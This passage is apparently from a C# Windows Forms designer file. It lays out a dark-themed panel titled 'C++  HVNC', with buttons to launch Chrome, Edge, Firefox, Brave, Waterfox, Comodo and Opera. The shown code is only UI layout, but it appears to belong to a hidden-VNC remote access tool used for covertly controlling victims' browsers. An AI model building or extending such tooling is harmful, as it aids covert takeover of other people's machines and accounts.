            this.btnBrave.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.btnBrave.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnBrave.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnBrave.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.btnBrave.DisabledState.Parent = this.btnBrave;
            this.btnBrave.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(22)))), ((int)(((byte)(22)))));
            this.btnBrave.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btnBrave.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.btnBrave.ForeColor = System.Drawing.Color.White;
            this.btnBrave.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
            this.btnBrave.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(191)))), ((int)(((byte)(37)))), ((int)(((byte)(33)))));
            this.btnBrave.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(36)))), ((int)(((byte)(36)))), ((int)(((byte)(36)))));
            this.btnBrave.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(22)))), ((int)(((byte)(22)))));
            this.btnBrave.HoverState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btnBrave.HoverState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(191)))), ((int)(((byte)(37)))), ((int)(((byte)(33)))));
            this.btnBrave.HoverState.Parent = this.btnBrave;
            this.btnBrave.Location = new System.Drawing.Point(119, 823);
            this.btnBrave.Name = "btnBrave";
            this.btnBrave.ShadowDecoration.Parent = this.btnBrave;
            this.btnBrave.Size = new System.Drawing.Size(110, 27);
            this.btnBrave.TabIndex = 155;
            this.btnBrave.Text = "Brave";
            this.btnBrave.Click += new System.EventHandler(this.btnBrave_Click);
            // 
            // btnEdge
            // 
            this.btnEdge.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.btnEdge.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(42)))), ((int)(((byte)(42)))), ((int)(((byte)(42)))));
            this.btnEdge.BorderThickness = 1;
            this.btnEdge.CheckedState.Parent = this.btnEdge;
            this.btnEdge.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.btnEdge.CustomImages.Parent = this.btnEdge;
            this.btnEdge.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.btnEdge.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.btnEdge.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnEdge.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnEdge.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.btnEdge.DisabledState.Parent = this.btnEdge;
            this.btnEdge.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(22)))), ((int)(((byte)(22)))));
            this.btnEdge.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btnEdge.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.btnEdge.ForeColor = System.Drawing.Color.White;
            this.btnEdge.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
            this.btnEdge.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(191)))), ((int)(((byte)(37)))), ((int)(((byte)(33)))));
            this.btnEdge.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(36)))), ((int)(((byte)(36)))), ((int)(((byte)(36)))));
            this.btnEdge.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(22)))), ((int)(((byte)(22)))));
            this.btnEdge.HoverState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btnEdge.HoverState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(191)))), ((int)(((byte)(37)))), ((int)(((byte)(33)))));
            this.btnEdge.HoverState.Parent = this.btnEdge;
            this.btnEdge.Location = new System.Drawing.Point(119, 792);
            this.btnEdge.Name = "btnEdge";
            this.btnEdge.ShadowDecoration.Parent = this.btnEdge;
            this.btnEdge.Size = new System.Drawing.Size(110, 27);
            this.btnEdge.TabIndex = 154;
            this.btnEdge.Text = "Edge";
            this.btnEdge.Click += new System.EventHandler(this.btnEdge_Click);
            // 
            // btnFirefox
            // 
            this.btnFirefox.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.btnFirefox.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(42)))), ((int)(((byte)(42)))), ((int)(((byte)(42)))));
            this.btnFirefox.BorderThickness = 1;
            this.btnFirefox.CheckedState.Parent = this.btnFirefox;
            this.btnFirefox.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.btnFirefox.CustomImages.Parent = this.btnFirefox;
            this.btnFirefox.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.btnFirefox.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.btnFirefox.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnFirefox.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnFirefox.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.btnFirefox.DisabledState.Parent = this.btnFirefox;
            this.btnFirefox.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(22)))), ((int)(((byte)(22)))));
            this.btnFirefox.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btnFirefox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.btnFirefox.ForeColor = System.Drawing.Color.White;
            this.btnFirefox.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
            this.btnFirefox.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(191)))), ((int)(((byte)(37)))), ((int)(((byte)(33)))));
            this.btnFirefox.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(36)))), ((int)(((byte)(36)))), ((int)(((byte)(36)))));
            this.btnFirefox.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(22)))), ((int)(((byte)(22)))));
            this.btnFirefox.HoverState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btnFirefox.HoverState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(191)))), ((int)(((byte)(37)))), ((int)(((byte)(33)))));
            this.btnFirefox.HoverState.Parent = this.btnFirefox;
            this.btnFirefox.Location = new System.Drawing.Point(4, 823);
            this.btnFirefox.Name = "btnFirefox";
            this.btnFirefox.ShadowDecoration.Parent = this.btnFirefox;
            this.btnFirefox.Size = new System.Drawing.Size(110, 27);
            this.btnFirefox.TabIndex = 153;
            this.btnFirefox.Text = "Firefox";
            this.btnFirefox.Click += new System.EventHandler(this.btnFirefox_Click);
            // 
            // btnStartL
            // 
            this.btnStartL.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.btnStartL.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(42)))), ((int)(((byte)(42)))), ((int)(((byte)(42)))));
            this.btnStartL.BorderThickness = 1;
            this.btnStartL.CheckedState.Parent = this.btnStartL;
            this.btnStartL.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.btnStartL.CustomImages.Parent = this.btnStartL;
            this.btnStartL.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.btnStartL.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.btnStartL.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnStartL.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnStartL.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.btnStartL.DisabledState.Parent = this.btnStartL;
            this.btnStartL.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(22)))), ((int)(((byte)(22)))));
            this.btnStartL.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btnStartL.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.btnStartL.ForeColor = System.Drawing.Color.White;
            this.btnStartL.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
            this.btnStartL.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(191)))), ((int)(((byte)(37)))), ((int)(((byte)(33)))));
            this.btnStartL.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(36)))), ((int)(((byte)(36)))), ((int)(((byte)(36)))));
            this.btnStartL.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(22)))), ((int)(((byte)(22)))));
            this.btnStartL.HoverState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btnStartL.HoverState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(191)))), ((int)(((byte)(37)))), ((int)(((byte)(33)))));
            this.btnStartL.HoverState.Parent = this.btnStartL;
            this.btnStartL.Location = new System.Drawing.Point(4, 792);
            this.btnStartL.Name = "btnStartL";
            this.btnStartL.ShadowDecoration.Parent = this.btnStartL;
            this.btnStartL.Size = new System.Drawing.Size(110, 27);
            this.btnStartL.TabIndex = 152;
            this.btnStartL.Text = "Chrome";
            this.btnStartL.Click += new System.EventHandler(this.btnStartChrome_Click);
            // 
            // guna2ShadowForm1
            // 
            this.guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(((int)(((byte)(191)))), ((int)(((byte)(38)))), ((int)(((byte)(33)))));
            // 
            // label1
            // 
            this.label1.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.ForeColor = System.Drawing.Color.LightGray;
            this.label1.Location = new System.Drawing.Point(454, 22);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(100, 20);
            this.label1.TabIndex = 165;
            this.label1.Text = "C++  HVNC";
            // 
            // guna2ControlBox3
            // 
            this.guna2ControlBox3.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2ControlBox3.ControlBoxType = Guna.UI2.WinForms.Enums.ControlBoxType.MinimizeBox;
            this.guna2ControlBox3.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.guna2ControlBox3.HoverState.Parent = this.guna2ControlBox3;
            this.guna2ControlBox3.IconColor = System.Drawing.Color.White;
            this.guna2ControlBox3.Location = new System.Drawing.Point(882, 10);
            this.guna2ControlBox3.Name = "guna2ControlBox3";
            this.guna2ControlBox3.ShadowDecoration.Parent = this.guna2ControlBox3;
            this.guna2ControlBox3.Size = new System.Drawing.Size(45, 31);
            this.guna2ControlBox3.TabIndex = 164;
            // 
            // guna2ControlBox2
            // 
            this.guna2ControlBox2.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2ControlBox2.ControlBoxType = Guna.UI2.WinForms.Enums.ControlBoxType.MaximizeBox;
            this.guna2ControlBox2.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.guna2ControlBox2.HoverState.Parent = this.guna2ControlBox2;
            this.guna2ControlBox2.IconColor = System.Drawing.Color.White;
            this.guna2ControlBox2.Location = new System.Drawing.Point(933, 10);
            this.guna2ControlBox2.Name = "guna2ControlBox2";
            this.guna2ControlBox2.ShadowDecoration.Parent = this.guna2ControlBox2;
            this.guna2ControlBox2.Size = new System.Drawing.Size(45, 31);
            this.guna2ControlBox2.TabIndex = 163;
            // 
            // guna2ControlBox1
            // 
            this.guna2ControlBox1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2ControlBox1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.guna2ControlBox1.HoverState.Parent = this.guna2ControlBox1;
            this.guna2ControlBox1.IconColor = System.Drawing.Color.White;
            this.guna2ControlBox1.Location = new System.Drawing.Point(984, 10);
            this.guna2ControlBox1.Name = "guna2ControlBox1";
            this.guna2ControlBox1.ShadowDecoration.Parent = this.guna2ControlBox1;
            this.guna2ControlBox1.Size = new System.Drawing.Size(45, 31);
            this.guna2ControlBox1.TabIndex = 162;
            // 
            // picTitleIcon
            // 
            this.picTitleIcon.Location = new System.Drawing.Point(1, 10);
            this.picTitleIcon.Name = "picTitleIcon";
            this.picTitleIcon.Size = new System.Drawing.Size(40, 31);
            this.picTitleIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.picTitleIcon.TabIndex = 161;
            this.picTitleIcon.TabStop = false;
            // 
            // btnWaterfox
            // 
            this.btnWaterfox.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.btnWaterfox.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(42)))), ((int)(((byte)(42)))), ((int)(((byte)(42)))));
            this.btnWaterfox.BorderThickness = 1;
            this.btnWaterfox.CheckedState.Parent = this.btnWaterfox;
            this.btnWaterfox.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.btnWaterfox.CustomImages.Parent = this.btnWaterfox;
            this.btnWaterfox.DisabledState.BorderColor = System.Drawing.Color.DimGray;
            this.btnWaterfox.DisabledState.CustomBorderColor = System.Drawing.Color.DimGray;
            this.btnWaterfox.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(36)))), ((int)(((byte)(36)))), ((int)(((byte)(36)))));
            this.btnWaterfox.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btnWaterfox.DisabledState.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnWaterfox.DisabledState.ForeColor = System.Drawing.Color.Gray;
            this.btnWaterfox.DisabledState.Parent = this.btnWaterfox;
            this.btnWaterfox.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(22)))), ((int)(((byte)(22)))));
            this.btnWaterfox.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btnWaterfox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.btnWaterfox.ForeColor = System.Drawing.Color.White;
            this.btnWaterfox.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
            this.btnWaterfox.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(191)))), ((int)(((byte)(37)))), ((int)(((byte)(33)))));
            this.btnWaterfox.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(36)))), ((int)(((byte)(36)))), ((int)(((byte)(36)))));
            this.btnWaterfox.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(22)))), ((int)(((byte)(22)))));
            this.btnWaterfox.HoverState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btnWaterfox.HoverState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(191)))), ((int)(((byte)(37)))), ((int)(((byte)(33)))));
            this.btnWaterfox.HoverState.Parent = this.btnWaterfox;
            this.btnWaterfox.Location = new System.Drawing.Point(234, 792);
            this.btnWaterfox.Name = "btnWaterfox";
            this.btnWaterfox.ShadowDecoration.Parent = this.btnWaterfox;
            this.btnWaterfox.Size = new System.Drawing.Size(110, 27);
            this.btnWaterfox.TabIndex = 259;
            this.btnWaterfox.Text = "Waterfox";
            this.btnWaterfox.Click += new System.EventHandler(this.btnWaterfox_Click);
            // 
            // btnComodo
            // 
            this.btnComodo.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.btnComodo.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(42)))), ((int)(((byte)(42)))), ((int)(((byte)(42)))));
            this.btnComodo.BorderThickness = 1;
            this.btnComodo.CheckedState.Parent = this.btnComodo;
            this.btnComodo.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.btnComodo.CustomImages.Parent = this.btnComodo;
            this.btnComodo.DisabledState.BorderColor = System.Drawing.Color.DimGray;
            this.btnComodo.DisabledState.CustomBorderColor = System.Drawing.Color.DimGray;
            this.btnComodo.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(36)))), ((int)(((byte)(36)))), ((int)(((byte)(36)))));
            this.btnComodo.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btnComodo.DisabledState.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnComodo.DisabledState.ForeColor = System.Drawing.Color.Gray;
            this.btnComodo.DisabledState.Parent = this.btnComodo;
            this.btnComodo.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(22)))), ((int)(((byte)(22)))));
            this.btnComodo.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btnComodo.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.btnComodo.ForeColor = System.Drawing.Color.White;
            this.btnComodo.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
            this.btnComodo.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(191)))), ((int)(((byte)(37)))), ((int)(((byte)(33)))));
            this.btnComodo.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(36)))), ((int)(((byte)(36)))), ((int)(((byte)(36)))));
            this.btnComodo.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(22)))), ((int)(((byte)(22)))));
            this.btnComodo.HoverState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btnComodo.HoverState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(191)))), ((int)(((byte)(37)))), ((int)(((byte)(33)))));
            this.btnComodo.HoverState.Parent = this.btnComodo;
            this.btnComodo.Location = new System.Drawing.Point(119, 854);
            this.btnComodo.Name = "btnComodo";
            this.btnComodo.ShadowDecoration.Parent = this.btnComodo;
            this.btnComodo.Size = new System.Drawing.Size(110, 27);
            this.btnComodo.TabIndex = 260;
            this.btnComodo.Text = "Comodo";
            this.btnComodo.Click += new System.EventHandler(this.btnComodo_Click);
            // 
            // btnOpera
            // 
            this.btnOpera.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.btnOpera.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(42)))), ((int)(((byte)(42)))), ((int)(((byte)(42)))));
            this.btnOpera.BorderThickness = 1;
            this.btnOpera.CheckedState.Parent = this.btnOpera;
            this.btnOpera.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.btnOpera.CustomImages.Parent = this.btnOpera;
            this.btnOpera.DisabledState.BorderColor = System.Drawing.Color.DimGray;
            this.btnOpera.DisabledState.CustomBorderColor = System.Drawing.Color.DimGray;
            this.btnOpera.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(36)))), ((int)(((byte)(36)))), ((int)(((byte)(36)))));
            this.btnOpera.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btnOpera.DisabledState.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnOpera.DisabledState.ForeColor = System.Drawing.Color.Gray;
            this.btnOpera.DisabledState.Parent = this.btnOpera;
            this.btnOpera.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(22)))), ((int)(((byte)(22)))));
            this.btnOpera.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btnOpera.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.btnOpera.ForeColor = System.Drawing.Color.White;
            this.btnOpera.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
            this.btnOpera.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(191)))), ((int)(((byte)(37)))), ((int)(((byte)(33)))));
            this.btnOpera.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(36)))), ((int)(((byte)(36)))), ((int)(((byte)(36)))));
            this.btnOpera.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(22)))), ((int)(((byte)(22)))));
            this.btnOpera.HoverState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btnOpera.HoverState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(191)))), ((int)(((byte)(37)))), ((int)(((byte)(33)))));
            this.btnOpera.HoverState.Parent = this.btnOpera;
            this.btnOpera.Location = new System.Drawing.Point(234, 854);
            this.btnOpera.Name = "btnOpera";
            this.btnOpera.ShadowDecoration.Parent = this.btnOpera;
            this.btnOpera.Size = new System.Drawing.Size(110, 27);
            this.btnOpera.TabIndex = 261;
            this.btnOpera.Text = "Opera";
            this.btnOpera.Click += new System.EventHandler(this.btnOpera_Click);
            // 
            // guna2PictureBox1
            // 
            this.guna2PictureBox1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2PictureBox1.BackColor = System.Drawing.Color.Transparent;
            this.guna2PictureBox1.ImageRotate = 0F;
            this.guna2PictureBox1.Location = new System.Drawing.Point(495, 796);
            this.guna2PictureBox1.Name = "guna2PictureBox1";
            this.guna2PictureBox1.ShadowDecoration.Parent = this.guna2PictureBox1;
            this.guna2PictureBox1.Size = new System.Drawing.Size(32, 32);
            this.guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.guna2PictureBox1.TabIndex = 262;
            this.guna2PictureBox1.TabStop = false;
            this.guna2PictureBox1.UseTransparentBackground = true;
            // 
            // guna2PictureBox2
            // 
            this.guna2PictureBox2.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2PictureBox2.BackColor = System.Drawing.Color.Transparent;
            this.guna2PictureBox2.ImageRotate = 0F;
            this.guna2PictureBox2.Location = new System.Drawing.Point(533, 796);
            this.guna2PictureBox2.Name = "guna2PictureBox2";
            this.guna2PictureBox2.ShadowDecoration.Parent = this.guna2PictureBox2;
            this.guna2PictureBox2.Size = new System.Drawing.Size(32, 32);
            this.guna2PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.guna2PictureBox2.TabIndex = 263;
            this.guna2PictureBox2.TabStop = false;
            this.guna2PictureBox2.UseTransparentBackground = true;
            // 
            // guna2PictureBox3
            // 
            this.guna2PictureBox3.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2PictureBox3.BackColor = System.Drawing.Color.Transparent;
            this.guna2PictureBox3.ImageRotate = 0F;
            this.guna2PictureBox3.Location = new System.Drawing.Point(571, 796);
            this.guna2PictureBox3.Name = "guna2PictureBox3";
            this.guna2PictureBox3.ShadowDecoration.Parent = this.guna2PictureBox3;
            this.guna2PictureBox3.Size = new System.Drawing.Size(32, 32);
            this.guna2PictureBox3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.guna2PictureBox3.TabIndex = 264;
            this.guna2PictureBox3.TabStop = false;
            this.guna2PictureBox3.UseTransparentBackground = true;
            // 
            // guna2PictureBox4
            // 
            this.guna2PictureBox4.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2PictureBox4.BackColor = System.Drawing.Color.Transparent;
            this.guna2PictureBox4.ImageRotate = 0F;
            this.guna2PictureBox4.Location = new System.Drawing.Point(609, 796);
            this.guna2PictureBox4.Name = "guna2PictureBox4";
            this.guna2PictureBox4.ShadowDecoration.Parent = this.guna2PictureBox4;
            this.guna2PictureBox4.Size = new System.Drawing.Size(32, 32);
            this.guna2PictureBox4.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.guna2PictureBox4.TabIndex = 265;
            this.guna2PictureBox4.TabStop = false;
            this.guna2PictureBox4.UseTransparentBackground = true;
            // 
            // guna2PictureBox6
            // 
            this.guna2PictureBox6.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2PictureBox6.BackColor = System.Drawing.Color.Transparent;
            this.guna2PictureBox6.ImageRotate = 0F;
            this.guna2PictureBox6.Location = new System.Drawing.Point(761, 796);
            this.guna2PictureBox6.Name = "guna2PictureBox6";
            this.guna2PictureBox6.ShadowDecoration.Parent = this.guna2PictureBox6;
            this.guna2PictureBox6.Size = new System.Drawing.Size(32, 32);
            this.guna2PictureBox6.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.guna2PictureBox6.TabIndex = 267;
            this.guna2PictureBox6.TabStop = false;
            this.guna2PictureBox6.UseTransparentBackground = true;
            // 
            // guna2PictureBox7
            // 
            this.guna2PictureBox7.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2PictureBox7.BackColor = System.Drawing.Color.Transparent;
            this.guna2PictureBox7.ImageRotate = 0F;
            this.guna2PictureBox7.Location = new System.Drawing.Point(723, 796);
            this.guna2PictureBox7.Name = "guna2PictureBox7";
            this.guna2PictureBox7.ShadowDecoration.Parent = this.guna2PictureBox7;
            this.guna2PictureBox7.Size = new System.Drawing.Size(32, 32);
            this.guna2PictureBox7.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.guna2PictureBox7.TabIndex = 268;
            this.guna2PictureBox7.TabStop = false;
            this.guna2PictureBox7.UseTransparentBackground = true;
            // 
            // guna2PictureBox8
            // 
